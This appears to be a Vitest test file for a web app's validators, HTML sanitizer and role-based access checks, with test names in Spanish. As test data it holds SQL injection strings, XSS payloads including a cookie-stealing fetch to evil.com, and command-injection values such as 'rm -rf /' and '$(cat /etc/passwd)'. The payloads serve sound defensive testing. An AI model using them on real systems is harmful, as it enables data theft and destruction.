import { describe, test, expect } from 'vitest';
import {
  validatePhoneNumberStrict,
  validateEmail,
  validateMessageLength,
  sanitizeInput,
} from '../../utils/validators';
import { escapeHtml, sanitizeHtml } from '../../utils/htmlSanitizer';
import {
  RBACError,
  validateUserAccess,
} from '../../utils/rbacValidator';
import {
  handleWebhookError,
} from '../../utils/webhookImprovements';

// ─── SQL Injection Prevention ──────────────────────────────────────────────────

describe('SQL Injection Prevention', () => {
  const sqlPayloads = [
    "'; DROP TABLE users; --",
    "1 OR 1=1",
    "1; SELECT * FROM passwords",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "1' AND '1'='1",
  ];

  test.each(sqlPayloads)('email rechaza payload SQL: %s', (payload) => {
    expect(validateEmail(payload)).toBe(false);
  });

  test.each(sqlPayloads)('teléfono estricto rechaza payload SQL: %s', (payload) => {
    expect(validatePhoneNumberStrict(payload)).toBe(false);
  });

  test('sanitizeInput elimina caracteres peligrosos de SQL', () => {
    const payload = "'; DROP TABLE users; --";
    const result = sanitizeInput(payload);
    // Must not retain raw SQL injection patterns through HTML chars
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });
});

// ─── XSS Prevention ───────────────────────────────────────────────────────────

describe('XSS Prevention', () => {
  test('sanitizeInput elimina etiquetas script', () => {
    const xss = '<script>alert("XSS")</script>';
    const result = sanitizeInput(xss);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
  });

  test('sanitizeInput elimina etiquetas img con onerror', () => {
    const xss = '<img src=x onerror=alert(1)>';
    const result = sanitizeInput(xss);
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result).not.toMatch(/onerror\s*=/i);
  });

  test('sanitizeInput elimina javascript: URI', () => {
    const xss = 'javascript:alert(document.cookie)';
    const result = sanitizeInput(xss);
    expect(result).not.toContain('javascript:');
  });

  test('sanitizeInput elimina manejadores de eventos onclick', () => {
    const xss = 'div onclick=stealCookies()';
    const result = sanitizeInput(xss);
    expect(result).not.toMatch(/onclick\s*=/i);
  });

  test('sanitizeInput elimina manejadores de eventos onload', () => {
    const xss = 'body onload=fetch("http://evil.com/?" + document.cookie)';
    const result = sanitizeInput(xss);
    expect(result).not.toMatch(/onload\s*=/i);
  });

  test('escapeHtml escapa correctamente los 5 caracteres HTML peligrosos', () => {
    const input = '<script>"&test\'</script>';
    const result = escapeHtml(input);
    expect(result).toContain('&lt;');
    expect(result).toContain('&gt;');
    expect(result).toContain('&quot;');
    expect(result).toContain('&amp;');
    expect(result).toContain('&#39;');
    expect(result).not.toContain('<script>');
  });

  test('sanitizeHtml previene ejecución de scripts', () => {
    const malicious = '<script>alert(1)</script>';
    const result = sanitizeHtml(malicious);
    expect(result).not.toContain('<script>');
  });

  test('email rechaza direcciones con XSS embebido', () => {
    expect(validateEmail('<script>@example.com')).toBe(false);
    expect(validateEmail('user@<script>.com')).toBe(false);
  });
});

// ─── Input Length & Overflow ───────────────────────────────────────────────────

describe('Input Length & Overflow Protection', () => {
  test('validateMessageLength rechaza mensajes excesivamente largos', () => {
    const oversized = 'A'.repeat(100_000);
    expect(validateMessageLength(oversized)).toBe(false);
  });

  test('validateMessageLength acepta el límite exacto', () => {
    const atLimit = 'A'.repeat(4096);
    expect(validateMessageLength(atLimit)).toBe(true);
  });

  test('validateMessageLength rechaza un mensaje sobre el límite personalizado', () => {
    expect(validateMessageLength('1234567890', 9)).toBe(false);
  });

  test('sanitizeInput maneja strings muy largos sin explotar', () => {
    const huge = '<b>'.repeat(10_000);
    expect(() => sanitizeInput(huge)).not.toThrow();
    const result = sanitizeInput(huge);
    expect(result).not.toContain('<');
  });
});

// ─── RBAC Enforcement ─────────────────────────────────────────────────────────

describe('RBAC Enforcement', () => {
  test('usuario no autenticado recibe 401', () => {
    try {
      validateUserAccess(null, ['admin', 'coordinador']);
      expect.fail('Debería haber lanzado un error');
    } catch (e: unknown) {
      expect(e instanceof RBACError).toBe(true);
      expect((e as RBACError).statusCode).toBe(401);
    }
  });

  test('camarero no puede acceder a rutas de admin', () => {
    const camarero = { id: 'c1', role: 'camarero' };
    try {
      validateUserAccess(camarero, ['admin']);
      expect.fail('Debería haber lanzado un error');
    } catch (e: unknown) {
      expect(e instanceof RBACError).toBe(true);
      expect((e as RBACError).statusCode).toBe(403);
    }
  });

  test('coordinador puede acceder a rutas de coordinador', () => {
    const coord = { id: 'c1', role: 'coordinador' };
    expect(() => validateUserAccess(coord, ['admin', 'coordinador'])).not.toThrow();
  });

  test('admin puede acceder a todas las rutas', () => {
    const admin = { id: 'a1', role: 'admin' };
    expect(() => validateUserAccess(admin, ['admin'])).not.toThrow();
    expect(() => validateUserAccess(admin, ['admin', 'coordinador'])).not.toThrow();
  });

  test('RBACError no expone stack trace en response', async () => {
    const rbacError = new RBACError('acceso denegado', 403);
    const response = handleWebhookError(rbacError, rbacError.statusCode);
    const body = await response.json();
    expect(body.stack).toBeUndefined();
    expect(body.error).toBe('acceso denegado');
  });
});

// ─── Phone Number Injection ────────────────────────────────────────────────────

describe('Phone Number Injection Prevention', () => {
  const injectionPayloads = [
    '+34600111222\nTo: attacker@evil.com',
    '+34600111222\r\nBCC: spam@evil.com',
    '600111222; rm -rf /',
    '$(cat /etc/passwd)',
    '`whoami`',
    '../../../etc/passwd',
  ];

  test.each(injectionPayloads)(
    'validatePhoneNumberStrict rechaza payload de inyección: %s',
    (payload) => {
      expect(validatePhoneNumberStrict(payload)).toBe(false);
    }
  );
});
